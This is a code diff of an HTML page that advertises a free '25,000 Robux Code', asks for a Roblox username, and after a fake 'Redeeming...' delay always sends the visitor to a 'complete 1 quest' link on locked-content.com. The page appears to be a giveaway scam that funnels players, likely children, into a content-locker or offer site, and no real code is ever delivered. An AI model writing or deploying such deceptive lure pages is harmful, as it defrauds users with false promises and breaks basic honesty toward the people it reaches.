@@ -1,38 +1,143 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>25,000 Robux Code</title>
-    <link rel="stylesheet" href="style.css" />
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Redeem</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 16px;
+    font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+    background: radial-gradient(circle at 50% 30%, #210b42 0%, #000000 70%);
+  }
+  .container { width: 100%; max-width: 384px; display: flex; flex-direction: column; align-items: center; }
+
+  .promo {
+    width: 100%;
+    border-radius: 16px;
+    padding: 12px 16px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    background-color: #34533e;
+    margin-bottom: 40px;
+  }
+  .promo-icon {
+    flex-shrink: 0;
+    width: 36px; height: 36px;
+    border-radius: 9999px;
+    background: rgba(255,255,255,0.15);
+    display: flex; align-items: center; justify-content: center;
+  }
+  .promo-icon svg { width: 20px; height: 20px; stroke: #fff; fill: none; stroke-width: 2; }
+  .promo-text { display: flex; flex-direction: column; }
+  .promo-title { color: #fff; font-weight: 600; font-size: 14px; line-height: 1.2; }
+  .promo-sub { color: rgba(255,255,255,0.8); font-size: 12px; }
+
+  h1 { color: #fff; font-weight: 700; text-transform: lowercase; font-size: 48px; letter-spacing: -0.02em; margin-bottom: 32px; }
+
+  form { width: 100%; display: flex; flex-direction: column; gap: 12px; }
+  input {
+    width: 100%;
+    background: transparent;
+    border: 1px solid rgba(255,255,255,0.7);
+    border-radius: 12px;
+    padding: 12px 16px;
+    color: #fff;
+    font-size: 14px;
+    outline: none;
+  }
+  input::placeholder { color: rgba(255,255,255,0.5); }
+  input:focus { border-color: #fff; }
+
+  button {
+    width: 100%;
+    border: none;
+    border-radius: 12px;
+    padding: 12px 16px;
+    color: #fff;
+    font-weight: 700;
+    font-size: 14px;
+    cursor: pointer;
+    margin-top: 4px;
+    background: linear-gradient(135deg, #2e1159 0%, #3f197d 100%);
+  }
+  button:disabled { opacity: 0.7; }
+
+  .verify-box { display: flex; flex-direction: column; align-items: center; gap: 12px; margin-top: 8px; }
+  .verify-box p { color: rgba(255,255,255,0.9); font-size: 12px; text-align: center; }
+  .verify-box a {
+    width: 100%;
+    border-radius: 12px;
+    padding: 12px 16px;
+    color: #fff;
+    font-weight: 700;
+    font-size: 14px;
+    text-align: center;
+    text-decoration: none;
+    background: linear-gradient(135deg, #2e1159 0%, #3f197d 100%);
+  }
+  .error { color: #f87171; font-size: 12px; text-align: center; margin-top: 4px; }
+</style>
 </head>
 <body>
-
-    <div class="container">
-
-        <div class="title">25,000 Robux Code:</div>
-
-        <div class="code-box">
-            <span class="code-text">SECRET4</span>
-            <button class="copy-btn" id="copyBtn">copy</button>
-        </div>
-
-        <div class="remaining">Only 20 codes remaining.</div>
-
-        <div class="redeem-section">
-            <div class="redeem-label">redeem</div>
-
-            <div class="redeem-row">
-                <input type="text" id="usernameInput" placeholder="Enter your username" />
-                <button class="redeem-btn" id="redeemBtn">Redeem</button>
-            </div>
-
-            <div class="username-label">Roblox Username</div>
-            <div class="status" id="statusMsg"></div>
-        </div>
-
+  <div class="container">
+    <div class="promo">
+      <div class="promo-icon">
+        <svg viewBox="0 0 24 24"><polyline points="20 12 20 22 4 22 4 12"></polyline><rect x="2" y="7" width="20" height="5"></rect><line x1="12" y1="22" x2="12" y2="7"></line><path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"></path><path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"></path></svg>
+      </div>
+      <div class="promo-text">
+        <span class="promo-title">25,000 Robux Code: SECRET4</span>
+        <span class="promo-sub">Only 20 codes remaining.</span>
+      </div>
     </div>
 
-    <script src="script.js"></script>
+    <h1>redeem</h1>
+
+    <form id="redeemForm">
+      <input type="text" id="code" value="SECRET4" placeholder="Code" />
+      <input type="text" id="username" placeholder="Roblox Username" />
+      <button type="submit" id="redeemBtn">Redeem</button>
+      <div id="message"></div>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById('redeemForm');
+    const codeInput = document.getElementById('code');
+    const usernameInput = document.getElementById('username');
+    const btn = document.getElementById('redeemBtn');
+    const message = document.getElementById('message');
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const code = codeInput.value.trim();
+      const username = usernameInput.value.trim();
+
+      if (!code || !username) {
+        message.innerHTML = '<p class="error">Please enter both a code and username.</p>';
+        return;
+      }
+
+      btn.disabled = true;
+      btn.textContent = 'Redeeming...';
+      message.innerHTML = '';
+
+      setTimeout(() => {
+        btn.disabled = false;
+        btn.textContent = 'Redeem';
+        message.innerHTML = `
+          <div class="verify-box">
+            <p>For security reasons u must complete 1 quest for ur code to be delivered</p>
+            <a href__="https://locked-content.com/?9ded58f" target="_blank" rel="noreferrer">Verify</a>
+          </div>`;
+      }, 1200);
+    });
+  </script>
 </body>
 </html>
